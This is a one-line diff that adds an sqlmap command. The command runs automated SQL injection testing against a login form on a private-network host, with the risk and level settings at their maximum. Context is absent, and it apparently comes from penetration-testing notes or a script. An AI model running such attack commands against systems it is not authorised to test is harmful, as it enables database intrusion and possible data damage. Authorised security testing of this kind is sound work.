@@ -1,0 +1,1 @@
+sqlmap -u "http://192.168.1.7:8080/auth/login" --data="password=test" --risk=3 --level=5
